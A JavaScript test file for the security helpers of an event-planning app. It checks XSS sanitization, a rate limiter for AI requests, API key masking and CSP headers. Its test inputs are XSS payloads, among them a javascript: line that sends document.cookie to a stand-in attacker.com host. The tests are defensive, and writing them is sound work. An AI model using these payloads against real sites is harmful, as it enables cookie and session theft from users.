import { describe, it, expect } from 'vitest';
import {
  sanitizeText,
  sanitizeInput,
  sanitizeObject,
  stripTagsWithContent,
  stripInlineEventHandlers,
  stripScriptProtocols,
  stripHtmlTags,
  aiRateLimiter,
  maskApiKey,
  CSP_POLICY_DIRECTIVES,
} from '../utils/security';
import { eventDataSchema } from '../schemas/eventSchemas';

describe('Security Suite: XSS Sanitization, Rate Limiter & CSP Directives', () => {
  describe('XSS Payload Stripping & Input Sanitization', () => {
    it('strips dangerous <script>alert("xss")</script> and <iframe> tags using sanitizeText', () => {
      const malicious = '<script>alert("xss")</script>The Grand Ballroom<iframe src="evil.com"></iframe>';
      const sanitized = sanitizeText(malicious);

      expect(sanitized).toBe('The Grand Ballroom');
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert');
      expect(sanitized).not.toContain('<iframe>');
    });

    it('strips inline event handler attributes (onerror, onclick, onload)', () => {
      const dirty = '<img src="invalid.jpg" onerror="alert(\'xss\')" />VIP Banquet Table';
      const clean = sanitizeInput(dirty);

      expect(clean).toBe('VIP Banquet Table');
      expect(clean).not.toContain('onerror');
      expect(clean).not.toContain('alert');
    });

    it('strips javascript: pseudo-protocol vectors', () => {
      const payload = 'javascript:fetch("https://attacker.com?c="+document.cookie)';
      const sanitized = sanitizeInput(payload);

      expect(sanitized).not.toContain('javascript:');
    });

    it('deeply sanitizes nested objects and arrays with sanitizeObject', () => {
      const nested = {
        title: '<script>alert(1)</script>Clean Header',
        metadata: {
          note: '<iframe src="x"></iframe>Important Details',
        },
        tags: ['<b>Bold</b>', '<script>alert(2)</script>Tag2'],
      };

      const clean = sanitizeObject(nested);
      expect(clean.title).toBe('Clean Header');
      expect(clean.metadata.note).toBe('Important Details');
      expect(clean.tags[0]).toBe('Bold');
      expect(clean.tags[1]).toBe('Tag2');
    });

    it('guarantees 100% parity between sanitizeInput and sanitizeText across all edge cases', () => {
      const edgeCases = [
        '<script>alert("xss")</script>Hello World',
        '<img src=x onerror=alert(1)>Event Hall',
        'javascript:doEvil()',
        '<iframe src="https://evil.com"></iframe>Notes',
        'Nested <script><script>alert(1)</script></script>Payload',
        'Normal clean text without markup 12345',
        '',
        '   padded string with spaces   ',
        '<a href="vbscript:msgbox(1)">Click here</a>',
      ];

      for (const input of edgeCases) {
        expect(sanitizeInput(input)).toBe(sanitizeText(input));
      }
    });

    it('verifies individual named security helpers execute with precision', () => {
      expect(stripTagsWithContent('<script>bad()</script>good')).toBe('good');
      expect(stripInlineEventHandlers('<div onclick="bad()" onerror="worse()">text</div>')).toBe('<div>text</div>');
      expect(stripScriptProtocols('javascript:alert(1)')).toBe('');
      expect(stripHtmlTags('<b>Bold</b> <i>Italic</i>')).toBe('Bold Italic');
    });

    it('automatically sanitizes string fields when parsing through Zod schemas', () => {
      const raw = {
        id: 'evt-xss',
        name: '<script>alert("xss")</script>Udaipur Royal Wedding',
        type: 'wedding',
        date: '2026-11-14',
        city: 'Udaipur<iframe src="evil.com"></iframe>',
        setting: 'hybrid',
        guestCount: 250,
        targetBudget: 1850000,
        currency: 'INR',
        culturalPreferences: '<b>Heritage</b>',
        subEvents: [],
      };

      const parsed = eventDataSchema.parse(raw);
      expect(parsed.name).toBe('Udaipur Royal Wedding');
      expect(parsed.city).toBe('Udaipur');
      expect(parsed.culturalPreferences).toBe('Heritage');
    });
  });

  describe('API Key Masking & AI Rate Limiter', () => {
    it('masks secret API keys to prevent exposure in DOM or exports', () => {
      expect(maskApiKey('AIzaSyAbcdef1234567890xyz')).toBe('AIza••••••••xyz');
      expect(maskApiKey(undefined)).toBe('Not Configured');
    });

    it('strictly enforces rate limit of maximum 10 requests per minute', () => {
      aiRateLimiter.reset();

      for (let i = 0; i < 10; i++) {
        expect(aiRateLimiter.checkRateLimit().allowed).toBe(true);
      }

      // 11th request is blocked
      const blocked = aiRateLimiter.checkRateLimit();
      expect(blocked.allowed).toBe(false);
      expect(blocked.retryAfterMs).toBeGreaterThan(0);

      aiRateLimiter.reset();
    });
  });

  describe('Content Security Policy (CSP) Directives', () => {
    it('defines strict CSP headers disallowing object embedding and unauthorized connections', () => {
      expect(CSP_POLICY_DIRECTIVES).toContain("default-src 'self'");
      expect(CSP_POLICY_DIRECTIVES).toContain("object-src 'none'");
      expect(CSP_POLICY_DIRECTIVES).toContain("base-uri 'self'");
      expect(CSP_POLICY_DIRECTIVES).toContain("connect-src 'self' https://generativelanguage.googleapis.com");
    });
  });
});

